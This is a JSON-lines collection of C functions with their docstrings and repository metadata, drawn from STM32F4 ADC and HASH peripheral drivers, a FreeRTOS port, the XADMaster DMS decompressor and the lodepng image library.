{"docstring": "/* reconstruction of tree */\n", "func_signal": "static void DMSreconst(struct DMSData *d)", "code": "{\n  xadUINT16 i, j, k, f, l;\n\n  /* collect leaf nodes in the first half of the table */\n  /* and replace the d->freq by (d->freq + 1) / 2. */\n  j = 0;\n  for (i = 0; i < DMST; i++)\n  {\n    if(d->son[i] >= DMST)\n    {\n      d->freq[j] = (xadUINT16) ((d->freq[i] + 1) / 2);\n      d->son[j] = d->son[i];\n      j++;\n    }\n  }\n  /* begin constructing tree by connecting d->sons */\n  for(i = 0, j = DMSN_BYTE; j < DMST; i += 2, j++)\n  {\n    k = (xadUINT16) (i + 1);\n    f = d->freq[j] = (xadUINT16) (d->freq[i] + d->freq[k]);\n    for(k = (xadUINT16)(j - 1); f < d->freq[k]; k--)\n      ;\n    k++;\n    for(l = j; l > k; --l)\n    {\n      d->freq[l] = d->freq[l-1];\n      d->son[l] = d->son[l-1];\n    }\n    d->freq[k] = f;\n    d->son[k] = i;\n  }\n  /* connect d->prnt */\n  for(i = 0; i < DMST; i++)\n  {\n    if((k = d->son[i]) >= DMST)\n      d->prnt[k] = i;\n    else\n      d->prnt[k] = d->prnt[k + 1] = i;\n  }\n}", "path": "XADMaster\\libxad\\clients\\DMS.c", "repo_name": "btrask/Sequential", "stars": 222, "license": "other", "language": "c", "size": 18746}
{"docstring": "/**\n  * @brief  Gets the selected ADC Software start regular conversion Status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC software start conversion (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetSoftwareStartConvStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  \n  /* Check the status of SWSTART bit */\n  if ((ADCx->CR2 & ADC_CR2_SWSTART) != (uint32_t)RESET)\n  {\n    /* SWSTART bit is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* SWSTART bit is reset */\n    bitstatus = RESET;\n  }\n  \n  /* Return the SWSTART bit status */\n  return  bitstatus;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Configures the sequencer length for injected channels\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  Length: The sequencer length. \n  *          This parameter must be a number between 1 to 4.\n  * @retval None\n  */\n", "func_signal": "void ADC_InjectedSequencerLengthConfig(ADC_TypeDef* ADCx, uint8_t Length)", "code": "{\n  uint32_t tmpreg1 = 0;\n  uint32_t tmpreg2 = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_LENGTH(Length));\n  \n  /* Get the old register value */\n  tmpreg1 = ADCx->JSQR;\n  \n  /* Clear the old injected sequence length JL bits */\n  tmpreg1 &= JSQR_JL_RESET;\n  \n  /* Set the injected sequence length JL bits */\n  tmpreg2 = Length - 1; \n  tmpreg1 |= tmpreg2 << 20;\n  \n  /* Store the new register value */\n  ADCx->JSQR = tmpreg1;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Enables the selected ADC software start conversion of the injected channels.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_SoftwareStartInjectedConv(ADC_TypeDef* ADCx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  /* Enable the selected ADC conversion for injected group */\n  ADCx->CR2 |= (uint32_t)ADC_CR2_JSWSTART;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Returns the ADC injected channel conversion result\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InjectedChannel: the converted ADC injected channel.\n  *          This parameter can be one of the following values:\n  *            @arg ADC_InjectedChannel_1: Injected Channel1 selected\n  *            @arg ADC_InjectedChannel_2: Injected Channel2 selected\n  *            @arg ADC_InjectedChannel_3: Injected Channel3 selected\n  *            @arg ADC_InjectedChannel_4: Injected Channel4 selected\n  * @retval The Data conversion value.\n  */\n", "func_signal": "uint16_t ADC_GetInjectedConversionValue(ADC_TypeDef* ADCx, uint8_t ADC_InjectedChannel)", "code": "{\n  __IO uint32_t tmp = 0;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_CHANNEL(ADC_InjectedChannel));\n\n  tmp = (uint32_t)ADCx;\n  tmp += ADC_InjectedChannel + JDR_OFFSET;\n  \n  /* Returns the selected injected channel conversion data value */\n  return (uint16_t) (*(__IO uint32_t*)  tmp); \n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Enables or disables the discontinuous mode for injected group \n  *         channel for the specified ADC\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC discontinuous mode on injected\n  *         group channel.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_InjectedDiscModeCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC injected discontinuous mode */\n    ADCx->CR1 |= (uint32_t)ADC_CR1_JDISCEN;\n  }\n  else\n  {\n    /* Disable the selected ADC injected discontinuous mode */\n    ADCx->CR1 &= (uint32_t)(~ADC_CR1_JDISCEN);\n  }\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Fills each ADC_CommonInitStruct member with its default value.\n  * @param  ADC_CommonInitStruct: pointer to an ADC_CommonInitTypeDef structure\n  *         which will be initialized.\n  * @retval None\n  */\n", "func_signal": "void ADC_CommonStructInit(ADC_CommonInitTypeDef* ADC_CommonInitStruct)", "code": "{\n  /* Initialize the ADC_Mode member */\n  ADC_CommonInitStruct->ADC_Mode = ADC_Mode_Independent;\n\n  /* initialize the ADC_Prescaler member */\n  ADC_CommonInitStruct->ADC_Prescaler = ADC_Prescaler_Div2;\n\n  /* Initialize the ADC_DMAAccessMode member */\n  ADC_CommonInitStruct->ADC_DMAAccessMode = ADC_DMAAccessMode_Disabled;\n\n  /* Initialize the ADC_TwoSamplingDelay member */\n  ADC_CommonInitStruct->ADC_TwoSamplingDelay = ADC_TwoSamplingDelay_5Cycles;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Configures the high and low thresholds of the analog watchdog.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  HighThreshold: the ADC analog watchdog High threshold value.\n  *          This parameter must be a 12-bit value.\n  * @param  LowThreshold:  the ADC analog watchdog Low threshold value.\n  *          This parameter must be a 12-bit value.\n  * @retval None\n  */\n", "func_signal": "void ADC_AnalogWatchdogThresholdsConfig(ADC_TypeDef* ADCx, uint16_t HighThreshold,\n                                        uint16_t LowThreshold)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_THRESHOLD(HighThreshold));\n  assert_param(IS_ADC_THRESHOLD(LowThreshold));\n  \n  /* Set the ADCx high threshold */\n  ADCx->HTR = HighThreshold;\n  \n  /* Set the ADCx low threshold */\n  ADCx->LTR = LowThreshold;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Configures the discontinuous mode for the selected ADC regular group \n  *         channel.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  Number: specifies the discontinuous mode regular channel count value.\n  *          This number must be between 1 and 8.\n  * @retval None\n  */\n", "func_signal": "void ADC_DiscModeChannelCountConfig(ADC_TypeDef* ADCx, uint8_t Number)", "code": "{\n  uint32_t tmpreg1 = 0;\n  uint32_t tmpreg2 = 0;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_REGULAR_DISC_NUMBER(Number));\n  \n  /* Get the old register value */\n  tmpreg1 = ADCx->CR1;\n  \n  /* Clear the old discontinuous mode channel count */\n  tmpreg1 &= CR1_DISCNUM_RESET;\n  \n  /* Set the discontinuous mode channel count */\n  tmpreg2 = Number - 1;\n  tmpreg1 |= tmpreg2 << 13;\n  \n  /* Store the new register value */\n  ADCx->CR1 = tmpreg1;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/*-----------------------------------------------------------*/\n", "func_signal": "BaseType_t xPortStartScheduler( void )", "code": "{\nextern void vPortStartFirstTask( void );\n\n\t/* Start the timer that generates the tick ISR.  Interrupts are disabled\n\there already. */\n\tprvSetupTimerInterrupt();\n\n\t/* Start the first task. */\n\tvPortStartFirstTask();\t\n\n\t/* Should not get here! */\n\treturn 0;\n}", "path": "Utilities\\FreeRTOS\\Source\\portable\\IAR\\AtmelSAM7S64\\port.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Initializes the ADCx peripheral according to the specified parameters \n  *         in the ADC_InitStruct.\n  * @note   This function is used to configure the global features of the ADC ( \n  *         Resolution and Data Alignment), however, the rest of the configuration\n  *         parameters are specific to the regular channels group (scan mode \n  *         activation, continuous mode activation, External trigger source and \n  *         edge, number of conversion in the regular channels group sequencer).  \n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InitStruct: pointer to an ADC_InitTypeDef structure that contains\n  *         the configuration information for the specified ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_Init(ADC_TypeDef* ADCx, ADC_InitTypeDef* ADC_InitStruct)", "code": "{\n  uint32_t tmpreg1 = 0;\n  uint8_t tmpreg2 = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_RESOLUTION(ADC_InitStruct->ADC_Resolution)); \n  assert_param(IS_FUNCTIONAL_STATE(ADC_InitStruct->ADC_ScanConvMode));\n  assert_param(IS_FUNCTIONAL_STATE(ADC_InitStruct->ADC_ContinuousConvMode)); \n  assert_param(IS_ADC_EXT_TRIG_EDGE(ADC_InitStruct->ADC_ExternalTrigConvEdge)); \n  assert_param(IS_ADC_EXT_TRIG(ADC_InitStruct->ADC_ExternalTrigConv));    \n  assert_param(IS_ADC_DATA_ALIGN(ADC_InitStruct->ADC_DataAlign)); \n  assert_param(IS_ADC_REGULAR_LENGTH(ADC_InitStruct->ADC_NbrOfConversion));\n  \n  /*---------------------------- ADCx CR1 Configuration -----------------*/\n  /* Get the ADCx CR1 value */\n  tmpreg1 = ADCx->CR1;\n  \n  /* Clear RES and SCAN bits */\n  tmpreg1 &= CR1_CLEAR_MASK;\n  \n  /* Configure ADCx: scan conversion mode and resolution */\n  /* Set SCAN bit according to ADC_ScanConvMode value */\n  /* Set RES bit according to ADC_Resolution value */ \n  tmpreg1 |= (uint32_t)(((uint32_t)ADC_InitStruct->ADC_ScanConvMode << 8) | \\\n                                   ADC_InitStruct->ADC_Resolution);\n  /* Write to ADCx CR1 */\n  ADCx->CR1 = tmpreg1;\n  /*---------------------------- ADCx CR2 Configuration -----------------*/\n  /* Get the ADCx CR2 value */\n  tmpreg1 = ADCx->CR2;\n  \n  /* Clear CONT, ALIGN, EXTEN and EXTSEL bits */\n  tmpreg1 &= CR2_CLEAR_MASK;\n  \n  /* Configure ADCx: external trigger event and edge, data alignment and \n     continuous conversion mode */\n  /* Set ALIGN bit according to ADC_DataAlign value */\n  /* Set EXTEN bits according to ADC_ExternalTrigConvEdge value */ \n  /* Set EXTSEL bits according to ADC_ExternalTrigConv value */\n  /* Set CONT bit according to ADC_ContinuousConvMode value */\n  tmpreg1 |= (uint32_t)(ADC_InitStruct->ADC_DataAlign | \\\n                        ADC_InitStruct->ADC_ExternalTrigConv | \n                        ADC_InitStruct->ADC_ExternalTrigConvEdge | \\\n                        ((uint32_t)ADC_InitStruct->ADC_ContinuousConvMode << 1));\n                        \n  /* Write to ADCx CR2 */\n  ADCx->CR2 = tmpreg1;\n  /*---------------------------- ADCx SQR1 Configuration -----------------*/\n  /* Get the ADCx SQR1 value */\n  tmpreg1 = ADCx->SQR1;\n  \n  /* Clear L bits */\n  tmpreg1 &= SQR1_L_RESET;\n  \n  /* Configure ADCx: regular channel sequence length */\n  /* Set L bits according to ADC_NbrOfConversion value */\n  tmpreg2 |= (uint8_t)(ADC_InitStruct->ADC_NbrOfConversion - (uint8_t)1);\n  tmpreg1 |= ((uint32_t)tmpreg2 << 20);\n  \n  /* Write to ADCx SQR1 */\n  ADCx->SQR1 = tmpreg1;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Enables the selected ADC software start conversion of the regular channels.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval None\n  */\n", "func_signal": "void ADC_SoftwareStartConv(ADC_TypeDef* ADCx)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  \n  /* Enable the selected ADC conversion for regular group */\n  ADCx->CR2 |= (uint32_t)ADC_CR2_SWSTART;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Enables or disables the ADC DMA request after last transfer (Single-ADC mode)  \n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC DMA request after last transfer.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_DMARequestAfterLastTransferCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC DMA request after last transfer */\n    ADCx->CR2 |= (uint32_t)ADC_CR2_DDS;\n  }\n  else\n  {\n    /* Disable the selected ADC DMA request after last transfer */\n    ADCx->CR2 &= (uint32_t)(~ADC_CR2_DDS);\n  }\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Set the injected channels conversion value offset\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_InjectedChannel: the ADC injected channel to set its offset. \n  *          This parameter can be one of the following values:\n  *            @arg ADC_InjectedChannel_1: Injected Channel1 selected\n  *            @arg ADC_InjectedChannel_2: Injected Channel2 selected\n  *            @arg ADC_InjectedChannel_3: Injected Channel3 selected\n  *            @arg ADC_InjectedChannel_4: Injected Channel4 selected\n  * @param  Offset: the offset value for the selected ADC injected channel\n  *          This parameter must be a 12bit value.\n  * @retval None\n  */\n", "func_signal": "void ADC_SetInjectedOffset(ADC_TypeDef* ADCx, uint8_t ADC_InjectedChannel, uint16_t Offset)", "code": "{\n    __IO uint32_t tmp = 0;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_INJECTED_CHANNEL(ADC_InjectedChannel));\n  assert_param(IS_ADC_OFFSET(Offset));\n  \n  tmp = (uint32_t)ADCx;\n  tmp += ADC_InjectedChannel;\n  \n  /* Set the selected injected channel data offset */\n *(__IO uint32_t *) tmp = (uint32_t)Offset;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Clears the HASH interrupt pending bit(s).\n  * @param  HASH_IT: specifies the HASH interrupt pending bit(s) to clear.\n  *          This parameter can be any combination of the following values:\n  *            @arg HASH_IT_DINI: Data Input interrupt\n  *            @arg HASH_IT_DCI: Digest Calculation Completion Interrupt\n  * @retval None\n  */\n", "func_signal": "void HASH_ClearITPendingBit(uint32_t HASH_IT)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_HASH_IT(HASH_IT));\n\n  /* Clear the selected HASH interrupt pending bit */\n  HASH->SR = (uint32_t)(~HASH_IT);\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_hash.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Enables or disables the VBAT (Voltage Battery) channel.\n  * \n  * @note   the Battery voltage measured is equal to VBAT/2 on STM32F40xx and \n  *         STM32F41xx devices and equal to VBAT/4 on STM32F42xx and STM32F43xx devices \n  *              \n  * @param  NewState: new state of the VBAT channel.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_VBATCmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the VBAT channel*/\n    ADC->CCR |= (uint32_t)ADC_CCR_VBATE;\n  }\n  else\n  {\n    /* Disable the VBAT channel*/\n    ADC->CCR &= (uint32_t)(~ADC_CCR_VBATE);\n  }\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Enables or disables the EOC on each regular channel conversion\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  NewState: new state of the selected ADC EOC flag rising\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_EOCOnEachRegularChannelCmd(ADC_TypeDef* ADCx, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  \n  if (NewState != DISABLE)\n  {\n    /* Enable the selected ADC EOC rising on each regular channel conversion */\n    ADCx->CR2 |= (uint32_t)ADC_CR2_EOCS;\n  }\n  else\n  {\n    /* Disable the selected ADC EOC rising on each regular channel conversion */\n    ADCx->CR2 &= (uint32_t)(~ADC_CR2_EOCS);\n  }\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Gets the selected ADC Software start injected conversion Status.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @retval The new state of ADC software start injected conversion (SET or RESET).\n  */\n", "func_signal": "FlagStatus ADC_GetSoftwareStartInjectedConvCmdStatus(ADC_TypeDef* ADCx)", "code": "{\n  FlagStatus bitstatus = RESET;\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  \n  /* Check the status of JSWSTART bit */\n  if ((ADCx->CR2 & ADC_CR2_JSWSTART) != (uint32_t)RESET)\n  {\n    /* JSWSTART bit is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* JSWSTART bit is reset */\n    bitstatus = RESET;\n  }\n  /* Return the JSWSTART bit status */\n  return  bitstatus;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Fills each ADC_InitStruct member with its default value.\n  * @note   This function is used to initialize the global features of the ADC ( \n  *         Resolution and Data Alignment), however, the rest of the configuration\n  *         parameters are specific to the regular channels group (scan mode \n  *         activation, continuous mode activation, External trigger source and \n  *         edge, number of conversion in the regular channels group sequencer).  \n  * @param  ADC_InitStruct: pointer to an ADC_InitTypeDef structure which will \n  *         be initialized.\n  * @retval None\n  */\n", "func_signal": "void ADC_StructInit(ADC_InitTypeDef* ADC_InitStruct)", "code": "{\n  /* Initialize the ADC_Mode member */\n  ADC_InitStruct->ADC_Resolution = ADC_Resolution_12b;\n\n  /* initialize the ADC_ScanConvMode member */\n  ADC_InitStruct->ADC_ScanConvMode = DISABLE;\n\n  /* Initialize the ADC_ContinuousConvMode member */\n  ADC_InitStruct->ADC_ContinuousConvMode = DISABLE;\n\n  /* Initialize the ADC_ExternalTrigConvEdge member */\n  ADC_InitStruct->ADC_ExternalTrigConvEdge = ADC_ExternalTrigConvEdge_None;\n\n  /* Initialize the ADC_ExternalTrigConv member */\n  ADC_InitStruct->ADC_ExternalTrigConv = ADC_ExternalTrigConv_T1_CC1;\n\n  /* Initialize the ADC_DataAlign member */\n  ADC_InitStruct->ADC_DataAlign = ADC_DataAlign_Right;\n\n  /* Initialize the ADC_NbrOfConversion member */\n  ADC_InitStruct->ADC_NbrOfConversion = 1;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Clears the ADCx's pending flags.\n  * @param  ADCx: where x can be 1, 2 or 3 to select the ADC peripheral.\n  * @param  ADC_FLAG: specifies the flag to clear. \n  *          This parameter can be any combination of the following values:\n  *            @arg ADC_FLAG_AWD: Analog watchdog flag\n  *            @arg ADC_FLAG_EOC: End of conversion flag\n  *            @arg ADC_FLAG_JEOC: End of injected group conversion flag\n  *            @arg ADC_FLAG_JSTRT: Start of injected group conversion flag\n  *            @arg ADC_FLAG_STRT: Start of regular group conversion flag\n  *            @arg ADC_FLAG_OVR: Overrun flag                          \n  * @retval None\n  */\n", "func_signal": "void ADC_ClearFlag(ADC_TypeDef* ADCx, uint8_t ADC_FLAG)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_PERIPH(ADCx));\n  assert_param(IS_ADC_CLEAR_FLAG(ADC_FLAG));\n\n  /* Clear the selected ADC flags */\n  ADCx->SR = ~(uint32_t)ADC_FLAG;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/**\n  * @brief  Checks whether the specified HASH flag is set or not.\n  * @param  HASH_FLAG: specifies the HASH flag to check.\n  *          This parameter can be one of the following values:\n  *            @arg HASH_FLAG_DINIS: Data input interrupt status flag\n  *            @arg HASH_FLAG_DCIS: Digest calculation completion interrupt status flag\n  *            @arg HASH_FLAG_BUSY: Busy flag\n  *            @arg HASH_FLAG_DMAS: DMAS Status flag\n  *            @arg HASH_FLAG_DINNE: Data Input register (DIN) not empty status flag\n  * @retval The new state of HASH_FLAG (SET or RESET)\n  */\n", "func_signal": "FlagStatus HASH_GetFlagStatus(uint32_t HASH_FLAG)", "code": "{\n  FlagStatus bitstatus = RESET;\n  uint32_t tempreg = 0;\n\n  /* Check the parameters */\n  assert_param(IS_HASH_GET_FLAG(HASH_FLAG));\n\n  /* check if the FLAG is in CR register */\n  if ((HASH_FLAG & HASH_FLAG_DINNE) != (uint32_t)RESET ) \n  {\n    tempreg = HASH->CR;\n  }\n  else /* The FLAG is in SR register */\n  {\n    tempreg = HASH->SR;\n  }\n\n  /* Check the status of the specified HASH flag */\n  if ((tempreg & HASH_FLAG) != (uint32_t)RESET)\n  {\n    /* HASH is set */\n    bitstatus = SET;\n  }\n  else\n  {\n    /* HASH_FLAG is reset */\n    bitstatus = RESET;\n  }\n\n  /* Return the HASH_FLAG status */\n  return  bitstatus;\n}", "path": "StLib\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_hash.c", "repo_name": "wujique/stm32f407", "stars": 141, "license": "None", "language": "c", "size": 11293}
{"docstring": "/*put a pixel, given its RGBA16 color, into image of any color 16-bitdepth type*/\n", "func_signal": "static void rgba16ToPixel(unsigned char* out, size_t i,\n                         const LodePNGColorMode* mode,\n                         unsigned short r, unsigned short g, unsigned short b, unsigned short a)", "code": "{\n  if(mode->colortype == LCT_GREY)\n  {\n    unsigned short grey = r; /*((unsigned)r + g + b) / 3*/;\n    out[i * 2 + 0] = (grey >> 8) & 255;\n    out[i * 2 + 1] = grey & 255;\n  }\n  else if(mode->colortype == LCT_RGB)\n  {\n    out[i * 6 + 0] = (r >> 8) & 255;\n    out[i * 6 + 1] = r & 255;\n    out[i * 6 + 2] = (g >> 8) & 255;\n    out[i * 6 + 3] = g & 255;\n    out[i * 6 + 4] = (b >> 8) & 255;\n    out[i * 6 + 5] = b & 255;\n  }\n  else if(mode->colortype == LCT_GREY_ALPHA)\n  {\n    unsigned short grey = r; /*((unsigned)r + g + b) / 3*/;\n    out[i * 4 + 0] = (grey >> 8) & 255;\n    out[i * 4 + 1] = grey & 255;\n    out[i * 4 + 2] = (a >> 8) & 255;\n    out[i * 4 + 3] = a & 255;\n  }\n  else if(mode->colortype == LCT_RGBA)\n  {\n    out[i * 8 + 0] = (r >> 8) & 255;\n    out[i * 8 + 1] = r & 255;\n    out[i * 8 + 2] = (g >> 8) & 255;\n    out[i * 8 + 3] = g & 255;\n    out[i * 8 + 4] = (b >> 8) & 255;\n    out[i * 8 + 5] = b & 255;\n    out[i * 8 + 6] = (a >> 8) & 255;\n    out[i * 8 + 7] = a & 255;\n  }\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*color is not allowed to already exist.\nIndex should be >= 0 (it's signed to be compatible with using -1 for \"doesn't exist\")*/\n", "func_signal": "static void color_tree_add(ColorTree* tree,\n                           unsigned char r, unsigned char g, unsigned char b, unsigned char a, unsigned index)", "code": "{\n  int bit;\n  for(bit = 0; bit < 8; ++bit)\n  {\n    int i = 8 * ((r >> bit) & 1) + 4 * ((g >> bit) & 1) + 2 * ((b >> bit) & 1) + 1 * ((a >> bit) & 1);\n    if(!tree->children[i])\n    {\n      tree->children[i] = (ColorTree*)lodepng_malloc(sizeof(ColorTree));\n      color_tree_init(tree->children[i]);\n    }\n    tree = tree->children[i];\n  }\n  tree->index = (int)index;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/* same as set but does not delete */\n", "func_signal": "static unsigned lodepng_assign_icc(LodePNGInfo* info, const char* name, const unsigned char* profile, unsigned profile_size)", "code": "{\n  info->iccp_name = alloc_string(name);\n  info->iccp_profile = (unsigned char*)lodepng_malloc(profile_size);\n\n  if(!info->iccp_name || !info->iccp_profile) return 83; /*alloc fail*/\n\n  memcpy(info->iccp_profile, profile, profile_size);\n  info->iccp_profile_size = profile_size;\n\n  return 0; /*ok*/\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/*Returns how many bits needed to represent given value (max 8 bit)*/\n", "func_signal": "static unsigned getValueRequiredBits(unsigned char value)", "code": "{\n  if(value == 0 || value == 255) return 1;\n  /*The scaling of 2-bit and 4-bit values uses multiples of 85 and 17*/\n  if(value % 17 == 0) return value % 85 == 0 ? 2 : 4;\n  return 8;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
{"docstring": "/* load file into buffer that already has the correct allocated size. Returns error code.*/\n", "func_signal": "static unsigned lodepng_buffer_file(unsigned char* out, size_t size, const char* filename)", "code": "{\n  FILE* file;\n  size_t readsize;\n  file = fopen(filename, \"rb\");\n  if(!file) return 78;\n\n  readsize = fread(out, 1, size, file);\n  fclose(file);\n\n  if (readsize != size) return 78;\n  return 0;\n}", "path": "lodepng.c", "repo_name": "LongSoft/CrScreenshotDxe", "stars": 159, "license": "bsd-2-clause", "language": "c", "size": 101}
